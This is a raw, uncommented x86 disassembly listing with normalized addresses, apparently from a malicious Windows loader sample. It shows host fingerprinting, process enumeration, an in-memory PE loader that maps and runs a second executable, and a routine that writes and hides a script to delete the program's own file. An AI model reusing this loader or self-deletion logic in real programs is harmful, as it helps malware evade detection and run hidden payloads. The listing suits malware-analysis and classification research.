call sub_200441c
add esp 0xc
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_2001be0
pop ecx
pop ecx
lea eax [ ebp - 0x2d0 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
mov [ ebp - 0x2d0 ] 0x40
call [ GetComputerNameA@IAT ]
lea eax [ ebp - 0x78 ]
push eax
call sub_2003720
pop ecx
push 0x8
mov esi eax
pop edi
cmp esi edi
mov [ ebp - 0x2d0 ] esi
jge r-xdata
or [ ebp - 0x2c9 ] 0x40
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_2003680
leave
retn
mov ecx r--data
lea edi [ ebp - 0x1c0 ]
call sub_2001ab7
push [ ebp - 0x2d4 ]
mov eax edi
push eax
lea eax [ ebp - 0xb8 ]
push eax
call sub_200441c
mov al [ ebp - 0x18 ]
mov [ ebx + 0x8 ] al
mov al [ ebp - 0x17 ]
mov [ ebx + 0x4 ] al
mov al [ ebp - 0x16 ]
mov [ ebx + 0x20 ] al
mov al [ ebp - 0x15 ]
mov [ ebx + 0x1b ] al
mov al [ ebp - 0x14 ]
mov [ ebx + 0xd ] al
mov al [ ebp - 0x13 ]
mov [ ebx + 0x3 ] al
mov al [ ebp - 0x12 ]
mov [ ebx + 0x15 ] al
mov al [ ebp - 0x11 ]
mov [ ebx + 0x19 ] al
mov al [ ebp - 0x10 ]
mov [ ebx + 0x23 ] al
mov al [ ebp - 0xf ]
mov [ ebx + 0x27 ] al
mov al [ ebp - 0xe ]
mov [ ebx + 0x13 ] al
mov al [ ebp - 0xd ]
mov [ ebx + 0xf ] al
mov al [ ebp - 0xb8 ]
mov [ ebx ] al
mov al [ ebp - 0xb7 ]
mov [ ebx + 0x24 ] al
mov al [ ebp - 0xb6 ]
mov [ ebx + 0x1d ] al
mov al [ ebp - 0xb5 ]
mov [ ebx + 0x1a ] al
mov al [ ebp - 0xb4 ]
mov [ ebx + 0x22 ] al
mov al [ ebp - 0xb3 ]
mov [ ebx + 0xc ] al
mov al [ ebp - 0xb2 ]
mov [ ebx + 0x10 ] al
mov al [ ebp - 0xb1 ]
mov [ ebx + 0x7 ] al
mov al [ ebp - 0x78 ]
mov [ ebx + 0x1f ] al
mov al [ ebp - 0x77 ]
mov [ ebx + 0x17 ] al
mov al [ ebp - 0x76 ]
mov [ ebx + 0x25 ] al
mov al [ ebp - 0x75 ]
mov [ ebx + 0x5 ] al
mov al [ ebp - 0x74 ]
mov [ ebx + 0xa ] al
mov al [ ebp - 0x73 ]
mov [ ebx + 0x14 ] al
mov al [ ebp - 0x72 ]
mov [ ebx + 0x12 ] al
mov al [ ebp - 0x71 ]
mov [ ebx + 0x1 ] al
mov al [ ebp - 0x34 ]
mov [ ebx + 0x26 ] al
mov al [ ebp - 0x33 ]
mov [ ebx + 0xe ] al
mov al [ ebp - 0x32 ]
mov [ ebx + 0xb ] al
mov al [ ebp - 0x31 ]
mov [ ebx + 0x11 ] al
mov al [ ebp - 0x30 ]
mov [ ebx + 0x18 ] al
mov al [ ebp - 0x2f ]
mov [ ebx + 0x1e ] al
mov al [ ebp - 0x2e ]
mov [ ebx + 0x21 ] al
mov al [ ebp - 0x2d ]
add esp 0xc
mov [ ebx + 0x2 ] al
mov al [ ebp - 0x24 ]
mov [ ebx + 0x6 ] al
mov al [ ebp - 0x23 ]
mov [ ebx + 0x16 ] al
mov al [ ebp - 0x22 ]
mov [ ebx + 0x1c ] al
mov al [ ebp - 0x21 ]
mov [ ebx + 0x9 ] al
xor eax eax
sub edi esi
push edi
lea eax [ ebp + esi - 0x78 ]
push 0x5f
push eax
call sub_20039e0
add esp 0xc
add esi edi
mov [ ebp - 0x2d0 ] esi
mov [ ebp + esi - 0x78 ] 0x0
sub_2002530
push ebp
mov ebp esp
push ecx
push ecx
push edi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] 0x1
push [ esi ]
mov [ ebp - 0x4 ] 0x105
call [ RegQueryValueExA@IAT ]
push [ esi ]
mov edi eax
call [ RegCloseKey@IAT ]
xor eax eax
test edi edi
sete al
pop edi
leave
retn
sub_2002570
push ebp
mov ebp esp
sub esp 0x358
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x350 ] eax
test eax eax
je r-xdata
xor eax eax
push eax
call sub_2003720
pop ecx
test eax eax
je r-xdata
mov esi 0x104
push esi
lea eax [ ebp - 0x21b ]
push 0x0
push eax
mov [ ebp - 0x21c ] 0x0
call sub_20039e0
push esi
lea eax [ ebp - 0x113 ]
push 0x0
push eax
mov [ ebp - 0x114 ] 0x0
call sub_20039e0
add esp 0x18
mov ecx r--data
lea edi [ ebp - 0x21c ]
call sub_2001ab7
mov ecx r--data
lea edi [ ebp - 0x114 ]
call sub_2001ab7
mov esi [ GetModuleHandleA@IAT ]
mov eax edi
push eax
lea eax [ ebp - 0x21c ]
push eax
call esi
mov ebx [ GetProcAddress@IAT ]
push eax
call ebx
mov [ ebp - 0x354 ] eax
test eax eax
je r-xdata
mov ecx r--data
call sub_2001ab7
mov eax edi
push eax
lea eax [ ebp - 0x21c ]
push eax
call esi
push eax
call ebx
mov [ ebp - 0x34c ] eax
test eax eax
je r-xdata
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov [ ebp - 0x348 ] eax
cmp eax 0xffffffff
je r-xdata
mov esi r--data
push esi
push [ ebp - 0x350 ]
call sub_2004877
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
push [ ebp - 0x348 ]
call [ CloseHandle@IAT ]
mov edi 0x128
test eax eax
jne r-xdata
push ebx
call sub_2003720
push eax
lea eax [ ebp - 0x320 ]
push ebx
push eax
call sub_200458b
add esp 0x10
test eax eax
je r-xdata
push esi
push eax
call sub_2004877
mov ebx eax
pop ecx
pop ecx
test ebx ebx
jne r-xdata
push [ ebp - 0x348 ]
call [ CloseHandle@IAT ]
xor eax eax
inc eax
jmp r-xdata
lea eax [ ebp - 0x344 ]
push eax
push [ ebp - 0x348 ]
mov [ ebp - 0x344 ] edi
call [ ebp - 0x34c ]
lea eax [ ebp - 0x344 ]
push eax
push [ ebp - 0x348 ]
mov [ ebp - 0x344 ] edi
call [ ebp - 0x354 ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_2003680
leave
retn
sub_2002710
push ecx
push ecx
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4 ] eax
push esi
push edi
mov esi 0x1160e
push esi
call sub_20046f8
mov edi eax
pop ecx
test edi edi
je r-xdata
mov ecx [ esp + 0xc ]
pop edi
pop esi
xor ecx esp
call sub_2003680
pop ecx
pop ecx
retn
push ebx
push ebp
mov ebx 0x68454
push ebx
call sub_20046f8
mov ebp eax
pop ecx
test ebp ebp
jne r-xdata
push esi
mov ecx rw-data
call sub_2001b45
push ebx
push 0x0
push ebp
call sub_20039e0
push esi
push edi
push ebp
lea esi [ esp + 0x2c ]
mov [ esp + 0x2c ] ebx
call sub_20032c0
add esp 0x1c
push edi
test eax eax
jge r-xdata
push edi
call sub_200368f
call sub_200368f
mov eax ebp
call sub_200368f
push ebp
call sub_200368f
pop ecx
jmp r-xdata
pop ecx
pop ebp
pop ebx
xor eax eax
jmp r-xdata
sub_20027a3
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
and [ ebp - 0x14 ] 0x0
push esi
push edi
mov esi 0x29416
push esi
mov [ ebp - 0x10 ] eax
call sub_20046f8
mov edi eax
pop ecx
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_2003680
leave
retn
push ebx
mov ebx 0x19c8dc
push ebx
call sub_20046f8
pop ecx
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
push esi
mov ecx rw-data
call sub_2001b45
push ebx
push 0x0
push [ ebp - 0xc ]
call sub_20039e0
push esi
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp - 0xc ]
push edi
push ebx
lea esi [ ebp - 0x8 ]
call sub_20032c0
add esp 0x1c
push edi
test eax eax
jge r-xdata
push edi
jmp r-xdata
call sub_200368f
pop ecx
xor esi esi
push esi
push esi
push 0x2
push esi
push esi
push 0xc0000000
push [ ebp - 0x10 ]
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_200368f
push ebx
call sub_200368f
pop ecx
jmp r-xdata
call sub_200368f
push esi
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x8 ]
push ebx
push edi
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
push ebx
pop ecx
xor eax eax
xor esi esi
inc esi
jmp r-xdata
push ebx
call sub_200368f
pop ecx
push edi
call [ CloseHandle@IAT ]
mov eax esi
jmp r-xdata
pop ebx
sub_200288f
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0x14 ]
push esi
lea esi [ ecx + eax + 0x18 ]
xor ecx ecx
cmp cx [ eax + 0x6 ]
jae r-xdata
pop esi
leave
retn
push ebx
push edi
mov edi [ VirtualAlloc@IAT ]
add esi 0x10
mov ebx 0x1000
push 0x4
push ebx
push eax
mov eax [ esi - 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call edi
mov ecx [ esi + 0x4 ]
push [ esi ]
add ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
push ecx
push eax
call sub_2003ed0
mov eax [ ebp - 0xc ]
mov [ esi - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0xc ] eax
test eax eax
jle r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
pop edi
pop ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
movzx eax [ eax + 0x6 ]
inc [ ebp - 0x4 ]
add esi 0x28
cmp [ ebp - 0x4 ] eax
jl r-xdata
push 0x4
push ebx
push eax
mov eax [ esi - 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call edi
push [ ebp - 0xc ]
mov [ esi - 0x8 ] eax
push 0x0
push eax
call sub_20039e0
jmp r-xdata
add esp 0xc
sub_2002936
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
movzx ecx [ eax + 0x14 ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
xor edx edx
lea ecx [ ecx + eax + 0x18 ]
cmp dx [ eax + 0x6 ]
jae r-xdata
leave
retn
push ebx
push esi
push edi
lea ebx [ ecx + 0x24 ]
mov edx [ ebx ]
lea ecx [ esi + ecx * 2 ]
lea ecx [ edi + ecx * 2 ]
mov edi [ ecx * 4 + rw-data ]
test edx 0x4000000
je r-xdata
push 0x4000
push [ ebx - 0x14 ]
push [ ebx - 0x1c ]
call [ VirtualFree@IAT ]
jmp r-xdata
mov esi [ ebx - 0x14 ]
mov ecx esi
test ecx ecx
jne r-xdata
or edi 0x200
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
movzx ecx [ eax + 0x6 ]
inc [ ebp - 0x4 ]
add ebx 0x28
cmp [ ebp - 0x4 ] ecx
jl r-xdata
jbe r-xdata
test dl 0x40
je r-xdata
mov esi [ ebx ]
mov edi [ ebx ]
mov ecx esi
shr ecx 0x1d
shr esi 0x1e
and ecx 0x1
and esi 0x1
shr edi 0x1f
test [ ebx ] __dos_header
je r-xdata
pop edi
pop esi
pop ebx
lea eax [ ebp - 0x8 ]
push eax
push edi
push esi
push [ ebx - 0x1c ]
call [ VirtualProtect@IAT ]
test dl dl
jns r-xdata
mov ecx [ eax + 0x20 ]
jmp r-xdata
mov ecx [ eax + 0x24 ]
test ecx ecx
sub_20029f9
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ eax + 0x4 ]
mov eax [ eax ]
add eax 0xa0
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
pop ebx
leave
retn
mov eax [ eax ]
add eax ebx
mov ecx [ eax ]
test ecx ecx
jbe r-xdata
push esi
push edi
add eax [ eax + 0x4 ]
mov ecx [ eax ]
test ecx ecx
ja r-xdata
movzx ecx [ esi ]
mov edx ecx
shr ecx 0xc
and edx 0xfff
cmp ecx 0x3
je r-xdata
and [ ebp - 0x4 ] 0x0
lea edi [ ecx + ebx ]
mov ecx [ eax + 0x4 ]
sub ecx 0x8
lea esi [ eax + 0x8 ]
test ecx 0xfffffffe
jbe r-xdata
pop edi
pop esi
lea ecx [ edx + edi ]
mov edx [ ebp + 0x8 ]
add [ ecx ] edx
cmp ecx 0xa
jne r-xdata
mov ecx [ eax + 0x4 ]
inc [ ebp - 0x4 ]
sub ecx 0x8
inc esi
shr ecx 0x1
inc esi
cmp [ ebp - 0x4 ] ecx
jb r-xdata
sub_2002a72
sub esp 0xc
mov eax [ ebx ]
sub eax 0xffffff80
cmp [ eax + 0x4 ] 0x0
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x8 ] 0x1
jbe r-xdata
mov eax [ esp + 0x8 ]
pop ebp
add esp 0xc
retn
push edi
mov edi [ eax ]
push 0x14
add edi ebp
push edi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
pop edi
push esi
pop esi
add eax ebp
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
mov [ esp + 0x14 ] esi
cmp esi 0xffffffff
je r-xdata
and [ esp + 0x10 ] 0x0
mov eax [ ebx + 0xc ]
lea eax [ eax * 4 + 0x4 ]
push eax
push [ ebx + 0x8 ]
call sub_2004938
pop ecx
pop ecx
mov [ ebx + 0x8 ] eax
test eax eax
je r-xdata
mov ecx [ ebx + 0xc ]
mov [ eax + ecx * 4 ] esi
inc [ ebx + 0xc ]
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ edi + 0x10 ]
lea esi [ eax + ebp ]
mov [ esp + 0xc ] esi
jmp r-xdata
mov esi [ edi + 0x10 ]
add eax ebp
mov [ esp + 0xc ] eax
add esi ebp
jmp r-xdata
mov eax [ esp + 0xc ]
mov eax [ eax ]
test eax eax
jne r-xdata
jns r-xdata
jmp r-xdata
add eax ebp
add eax 0x2
and eax 0xffff
jmp r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
and [ esp + 0x10 ] 0x0
add [ esp + 0xc ] 0x4
add esi 0x4
push eax
push [ esp + 0x18 ]
call [ GetProcAddress@IAT ]
mov [ esi ] eax
test eax eax
je r-xdata
push 0x14
add edi 0x14
push edi
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
jmp r-xdata
sub_2002b73
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
push edi
mov edi [ eax + 0x3c ]
add edi eax
cmp [ edi ] 0x4550
je r-xdata
xor eax eax
leave
retn
push ebx
push esi
mov esi [ VirtualAlloc@IAT ]
push 0x40
mov ebx 0x2000
push ebx
push [ edi + 0x50 ]
push [ edi + 0x34 ]
call esi
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push 0x14
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
mov eax [ ebp - 0x4 ]
push 0x40
xor ecx ecx
push 0x1000
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x10 ] ecx
push [ edi + 0x50 ]
push eax
call esi
push 0x40
push 0x1000
push [ edi + 0x54 ]
push [ ebp - 0x4 ]
call esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x3c ]
add ecx [ edi + 0x54 ]
mov [ ebp - 0x8 ] eax
push ecx
push esi
push eax
call sub_2003ed0
mov eax [ esi + 0x3c ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov ecx [ ebp - 0x4 ]
push ebx
push edi
mov [ ebx ] eax
push esi
mov [ eax + 0x34 ] ecx
call sub_200288f
mov esi [ ebp - 0x4 ]
mov eax esi
add esp 0x18
sub eax [ edi + 0x34 ]
je r-xdata
push 0x40
push ebx
push [ edi + 0x50 ]
push eax
call esi
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
pop edi
leave
retn
call sub_2002a72
test eax eax
je r-xdata
push eax
mov eax ebx
call sub_20029f9
pop ecx
xor eax eax
jmp r-xdata
mov esi ebx
call sub_2002d1d
push ebx
call sub_2002936
mov eax [ ebx ]
mov eax [ eax + 0x28 ]
pop ecx
test eax eax
je r-xdata
pop esi
pop ebx
mov eax ebx
add eax esi
je r-xdata
push 0x0
xor edi edi
inc edi
push edi
push esi
call eax
test eax eax
jne r-xdata
mov [ ebx + 0x10 ] edi
sub_2002c92
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
add eax 0x78
xor edx edx
push ebx
push edi
mov [ ebp - 0x8 ] ecx
cmp [ eax + 0x4 ] edx
jne r-xdata
push esi
mov esi [ eax ]
add esi ecx
mov eax [ esi + 0x18 ]
cmp eax edx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
cmp [ esi + 0x14 ] edx
je r-xdata
pop edi
pop ebx
leave
retn
mov edi [ esi + 0x20 ]
mov ebx [ esi + 0x24 ]
add edi ecx
add ebx ecx
mov [ ebp - 0x4 ] edx
cmp eax edx
ja r-xdata
mov eax [ edi ]
add eax ecx
push eax
push [ ebp + 0x8 ]
call sub_20043ca
pop ecx
pop ecx
test eax eax
je r-xdata
movzx eax [ ebx ]
cmp eax 0xffffffff
je r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x4
inc ebx
inc ebx
cmp eax [ esi + 0x18 ]
jb r-xdata
cmp eax [ esi + 0x14 ]
ja r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ esi + 0x1c ]
lea eax [ ecx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov eax [ eax + ecx ]
add eax ecx
jmp r-xdata
pop esi
sub_2002d1d
push ebx
xor ebx ebx
cmp esi ebx
je r-xdata
pop ebx
retn
cmp [ esi + 0x10 ] ebx
je r-xdata
cmp [ esi + 0x8 ] ebx
je r-xdata
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
mov ecx [ ecx + 0x28 ]
push ebx
push ebx
push eax
add ecx eax
call ecx
mov [ esi + 0x10 ] ebx
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
push edi
xor edi edi
cmp [ esi + 0xc ] ebx
jle r-xdata
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push 0x8000
push ebx
push eax
call [ VirtualFree@IAT ]
push [ esi + 0x8 ]
call sub_200368f
pop ecx
pop edi
mov eax [ esi + 0x8 ]
lea eax [ eax + edi * 4 ]
cmp [ eax ] 0xffffffff
je r-xdata
inc edi
cmp edi [ esi + 0xc ]
jl r-xdata
push [ eax ]
call [ FreeLibrary@IAT ]
sub_2002d90
push ebp
mov ebp esp
sub esp 0xa88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi 0x103
xor ebx ebx
push esi
mov [ ebp - 0xa28 ] eax
lea eax [ ebp - 0x113 ]
push ebx
push eax
mov [ ebp - 0x114 ] bl
call sub_20039e0
add esp 0xc
push esi
lea eax [ ebp - 0x323 ]
push ebx
push eax
mov [ ebp - 0x324 ] bl
call sub_20039e0
add esp 0xc
lea edi [ esi + 0x1 ]
push edi
lea eax [ ebp - 0x324 ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_2003680
leave
retn
cmp [ ebp - 0xa28 ] ebx
je r-xdata
push 0x4
lea ecx [ ebp - 0x114 ]
pop eax
call sub_2001977
lea eax [ ebp - 0x114 ]
push eax
call sub_2002570
pop ecx
test eax eax
jne r-xdata
push [ ebp - 0xa28 ]
call sub_2003720
pop ecx
test eax eax
je r-xdata
push edi
lea eax [ ebp - 0x533 ]
push ebx
push eax
mov [ ebp - 0x534 ] bl
call sub_20039e0
add esp 0xc
push edi
lea eax [ ebp - 0x21b ]
push ebx
push eax
mov [ ebp - 0x21c ] bl
call sub_20039e0
add esp 0xc
mov ecx r--data
lea edi [ ebp - 0x534 ]
call sub_2001ab7
mov ecx r--data
lea edi [ ebp - 0x21c ]
call sub_2001ab7
mov eax edi
push eax
lea eax [ ebp - 0x534 ]
push eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
push 0x3
lea ecx [ ebp - 0x114 ]
pop eax
call sub_2001977
lea eax [ ebp - 0x114 ]
push eax
call sub_2002570
pop ecx
test eax eax
jne r-xdata
push [ ebp - 0xa28 ]
lea eax [ ebp - 0x324 ]
push eax
call sub_20043ca
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x4
push ebx
lea ecx [ ebp - 0x324 ]
push ecx
call eax
jmp r-xdata
push 0x9
lea ecx [ ebp - 0x114 ]
pop eax
call sub_2001977
lea eax [ ebp - 0x114 ]
push eax
call sub_2002570
pop ecx
test eax eax
jne r-xdata
push [ ebp - 0xa28 ]
call [ DeleteFileA@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x114 ]
call sub_2001977
lea eax [ ebp - 0x114 ]
push eax
call sub_2002570
pop ecx
test eax eax
je r-xdata
mov ecx r--data
lea edi [ ebp - 0x114 ]
call sub_2001ab7
mov edi [ lstrcpyA@IAT ]
lea eax [ ebp - 0x324 ]
push eax
lea eax [ ebp - 0x63c ]
push eax
call edi
lea eax [ ebp - 0x63c ]
push 0x5c
push eax
call sub_2003db0
pop ecx
mov [ eax ] bl
pop ecx
lea eax [ ebp - 0x63c ]
push eax
lea eax [ ebp - 0x42c ]
push eax
call edi
mov edi [ lstrcatA@IAT ]
push r--data
lea eax [ ebp - 0x42c ]
push eax
call edi
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x42c ]
push eax
call edi
push ebx
push 0x8000080
push 0x2
push ebx
push ebx
push 0x40000000
lea eax [ ebp - 0x42c ]
push eax
call [ CreateFileA@IAT ]
mov [ ebp - 0xa28 ] eax
cmp eax 0xffffffff
je r-xdata
push ebx
call [ PostQuitMessage@IAT ]
push esi
lea eax [ ebp - 0x21b ]
push ebx
push eax
mov [ ebp - 0x21c ] bl
call sub_20039e0
add esp 0xc
mov ecx r--data
lea edi [ ebp - 0xa24 ]
call sub_2001ab7
mov esi r--data
mov eax edi
push esi
push eax
call sub_20037c0
mov ecx r--data
lea edi [ ebp - 0x21c ]
call sub_2001ab7
lea eax [ ebp - 0x324 ]
push eax
mov eax edi
push eax
lea eax [ ebp - 0x114 ]
push eax
call [ wsprintfA@IAT ]
add esp 0x14
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0xa24 ]
push eax
call sub_20037c0
lea eax [ ebp - 0xa24 ]
push esi
push eax
call sub_20037c0
mov ecx r--data
call sub_2001ab7
lea eax [ ebp - 0x324 ]
push eax
mov eax edi
push eax
lea eax [ ebp - 0x114 ]
push eax
call [ wsprintfA@IAT ]
add esp 0x1c
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0xa24 ]
push eax
call sub_20037c0
lea eax [ ebp - 0xa24 ]
push esi
push eax
call sub_20037c0
mov ecx r--data
call sub_2001ab7
lea eax [ ebp - 0x42c ]
push eax
mov eax edi
push eax
lea eax [ ebp - 0x114 ]
push eax
call [ wsprintfA@IAT ]
add esp 0x1c
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0xa24 ]
push eax
call sub_20037c0
lea eax [ ebp - 0xa24 ]
push esi
push eax
call sub_20037c0
add esp 0x10
push ebx
lea eax [ ebp - 0xa3c ]
push eax
lea eax [ ebp - 0xa24 ]
push eax
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0xa24 ]
push eax
push [ ebp - 0xa28 ]
call [ WriteFile@IAT ]
push [ ebp - 0xa28 ]
mov esi [ CloseHandle@IAT ]
call esi
push 0x64
call [ Sleep@IAT ]
push 0x44
pop edi
push edi
lea eax [ ebp - 0xa84 ]
push ebx
push eax
call sub_20039e0
mov [ ebp - 0xa84 ] edi
xor eax eax
add esp 0xc
mov ecx r--data
lea edi [ ebp - 0x114 ]
mov [ ebp - 0xa58 ] 0x1
mov [ ebp - 0xa54 ] ax
call sub_2001ab7
mov eax edi
push eax
call [ LoadLibraryA@IAT ]
mov [ ebp - 0xa28 ] eax
cmp eax ebx
je r-xdata
mov ecx r--data
call sub_2001ab7
mov eax edi
push eax
push [ ebp - 0xa28 ]
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0xa38 ]
push ecx
lea ecx [ ebp - 0xa84 ]
push ecx
push ebx
push ebx
push 0x44
push ebx
push ebx
push ebx
lea ecx [ ebp - 0x42c ]
push ecx
push ebx
call eax
test eax eax
je r-xdata
mov edi [ SetThreadPriority@IAT ]
push 0xfffffff1
push [ ebp - 0xa34 ]
call edi
push 0xf
call [ GetCurrentThread@IAT ]
push eax
call edi
push 0x80
call [ GetCurrentProcess@IAT ]
push eax
call [ SetPriorityClass@IAT ]
push [ ebp - 0xa38 ]
call esi
push [ ebp - 0xa34 ]
call [ ResumeThread@IAT ]
push [ ebp - 0xa34 ]
call esi
sub_2003210
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov eax ebp
push edi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
mov eax [ esp + 0x18 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ebx eax
mov eax 0x1
sub eax ebx
add esi eax
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
lea esp [ esp ]
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
retn
inc edi
inc ebp
cmp edi esi
jl r-xdata
mov ecx [ esp + 0x18 ]
push ebx
push ecx
push ebp
call sub_2004f2f
add esp 0xc
test eax eax
je r-xdata
sub_2003280
push esi
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
retn
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
push 0xc0000000
push esi
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov eax 0x1
retn
sub_20032c0
sub esp 0x18
call sub_2003330
test eax eax
jl r-xdata
or eax 0xffffffff
add esp 0x18
retn
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x24 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp ] edx
lea edx [ esp ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x8 ] eax
mov [ esp + 0x10 ] ecx
mov ecx [ esi ]
push edx
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0xc ] ecx
call sub_20033e0
add esp 0x8
test eax eax
jge r-xdata
call sub_2003390
mov ecx [ esp + 0x8 ]
mov [ esi ] ecx
xor eax eax
add esp 0x18
retn
call sub_2003390
sub_2003330
cmp [ rw-data ] 0x0
je r-xdata
push esi
push edi
push 0x4e74
call sub_20046f8
mov esi eax
push 0x4e74
mov [ rw-data ] esi
call sub_20046f8
mov edi eax
push 0x139d
mov [ rw-data ] edi
call sub_20046f8
add esp 0xc
mov [ rw-data ] eax
test esi esi
je r-xdata
xor eax eax
retn
pop edi
or eax 0xffffffff
pop esi
retn
test edi edi
je r-xdata
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
sub_2003390
mov eax [ rw-data ]
push eax
call sub_200368f
mov ecx [ rw-data ]
push ecx
call sub_200368f
mov edx [ rw-data ]
push edx
call sub_200368f
xor eax eax
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_20033e0
sub esp 0x14
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x28 ]
mov [ esp + 0x14 ] 0x100
call sub_2003580
mov ecx [ esp + 0x2c ]
mov edx eax
mov eax [ ecx + 0x8 ]
cmp [ ecx + 0x4 ] eax
mov [ esp + 0x18 ] edx
mov [ esp + 0x10 ] edx
jle r-xdata
call sub_2003330
call sub_2003580
mov edi eax
mov [ esp + 0x1c ] edi
cmp edi 0xfff
je r-xdata
mov esi [ ecx ]
mov [ eax + esi ] dl
inc eax
mov [ ecx + 0x8 ] eax
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn
mov ebp [ rw-data ]
mov ebx [ rw-data ]
mov ecx edi
mov edx rw-data
cmp edi 0xff
jbe r-xdata
mov ecx [ esp + 0x18 ]
mov al [ esp + 0x10 ]
mov [ rw-data ] al
mov edx rw-data
cmp ecx 0xff
jbe r-xdata
mov [ edx ] cl
movzx ecx [ edx ]
